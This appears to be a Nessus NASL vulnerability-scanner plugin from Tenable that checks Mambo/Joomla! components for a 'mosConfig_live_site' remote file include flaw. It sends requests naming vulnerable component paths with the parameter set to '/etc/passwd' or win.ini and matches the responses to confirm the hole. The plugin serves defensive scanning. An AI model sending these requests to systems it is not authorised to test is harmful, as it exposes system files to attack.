#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(26059);
  script_version("$Revision: 1.30 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id(
    "CVE-2007-4923",
    "CVE-2007-5309",
    "CVE-2007-5363",
    "CVE-2007-5410",
    "CVE-2007-5451"
  );
  script_bugtraq_id(
    25664,
    25946,
    25958,
    25999,
    26059
  );
  script_osvdb_id(
    37028,
    38585,
    38645,
    40609,
    43765
  );
  script_xref(name:"EDB-ID", value:"4401");
  script_xref(name:"EDB-ID", value:"4489");
  script_xref(name:"EDB-ID", value:"4496");
  script_xref(name:"EDB-ID", value:"4524");

  script_name(english:"Mambo / Joomla! Multiple Components 'mosConfig_live_site' Parameter Remote File Include");
  script_summary(english:"Attempts to read a local file using Mambo / Joomla! components.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
remote file include vulnerability.");
  script_set_attribute(attribute:"description", value:
"A third-party component for Mambo or Joomla! is running on the remote
host. At least one such component is affected by a remote file include
vulnerability due to improper sanitization of user-supplied input to
the 'mosConfig_live_site' parameter before using it to include PHP
code. Provided the PHP 'register_globals' setting is enabled, an
unauthenticated, remote attacker can exploit this issue to disclose
arbitrary files or execute arbitrary PHP code on the remote host,
subject to the privileges of the web server user ID.");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/481979/30/0/threaded");
  script_set_attribute(attribute:"solution", value:
"Disable the PHP 'register_globals' setting or contact the product's
vendor to see if an upgrade exists.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');
  script_cwe_id(94);

  script_set_attribute(attribute:"vuln_publication_date", value:"2007/09/13");
  script_set_attribute(attribute:"plugin_publication_date", value:"2007/09/17");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2017 Tenable Network Security, Inc.");

  script_dependencies("mambo_detect.nasl", "joomla_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");

  exit(0);
}
include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

port = get_http_port(default:80, php:TRUE);

# Vulnerable scripts.
ncoms = 0;
com = make_array();
# -   ColorLAB
com[ncoms++] = "/administrator/components/com_color/admin.color.php";
# -   Joomla!Radio
com[ncoms++] = "/administrator/components/com_joomlaradiov5/admin.joomlaradiov5.php";
# -   Panoramic
com[ncoms++] = "/administrator/components/com_panoramic/admin.panoramic.php";
# -    WmT Flash Gallery
com[ncoms++] = "/administrator/components/com_wmtgallery/admin.wmtgallery.php";
# -    WmT Flash RSS Reader
com[ncoms++] = "/administrator/components/com_wmtrssreader/admin.wmtrssreader.php";

app = "Mambo / Joomla!";
# Generate a list of paths to check.
ndirs = 0;
# - Mambo Open Source.
install = get_kb_item("www/" +port+ "/mambo_mos");
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}
# - Joomla
joomla_installs = get_installs(
  app_name : "Joomla!",
  port     : port
);

if (joomla_installs[0] == IF_OK)
{
  foreach install (joomla_installs[1])
  {
    dir = install['path'];
    dirs[ndirs++] = dir;
  }
}

if (max_index(dirs) == 0)
  audit(AUDIT_WEB_APP_NOT_INST, app, port);

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    files = make_list('/windows/win.ini','/winnt/win.ini');
  else
    files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini', 'LICENSE.php');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['LICENSE.php'] = "GNU GENERAL PUBLIC LICENSE";

# Loop through each directory.
info = "";
contents = "";
found_file = "";
non_affect = make_list();

foreach dir (list_uniq(dirs))
{
  for (i=0; i<ncoms; i++)
  {
    foreach file (files)
    {
      # Once we find a file that works, stick with it for any subsequent tests.
      if (found_file && file != found_file) continue;

      r = http_send_recv3(
        method : "GET",
        port   : port,
        item   : dir + com[i] + "?mosConfig_live_site=" + file,
        exit_on_fail : TRUE
      );
      res = r[2];

      # There's a problem if...
      if (
        egrep(pattern:file_pats[file], string:res) ||
        # we get an error claiming the file doesn't exist or...
        file+"): failed to open stream: No such file" >< res ||
        file+") [function.require-once]: failed to open stream: No such file" >< res ||
        file+") [<a href='function.require-once'>function.require-once</a>]: failed to open stream: No such file" >< res ||
        # we get an error about open_basedir restriction.
        file+") [function.require-once]: failed to open stream: Operation not permitted" >< res ||
        file+") [<a href='function.require-once'>function.require-once</a>]: failed to open stream: Operation not permitted" >< res ||
        "open_basedir restriction in effect. File("+file >< res ||
        # we get an error because magic_quotes was enabled or...
        file+".php" >< res
      )
      {
        found_file = file;
        info = info + "  " + dir + com[i] + '\n';
        contents = res;
      }
      if (!thorough_tests) break;
    }
  }
  non_affect = make_list(non_affect, dir);
  if (info && !thorough_tests) break;
}

if (!info)
{
  installs = max_index(non_affect);

  if (installs == 0)
    exit(0, "None of the "+app+ " installs (" + join(dirs, sep:" & ") + ") on port " + port+ " are affected.");

  else if (installs == 1)
    audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:dir, port:port));

  else exit(0, "None of the "+app+ " installs (" + join(non_affect, sep:" & ") + ") on port " + port + " are affected.");
}

# Report findings.
security_report_v4(
  port        : port,
  severity    : SECURITY_WARNING,
  file        : found_file,
  request     : split(info),
  output      : contents,
  attach_type : 'text/plain'
);
exit(0);
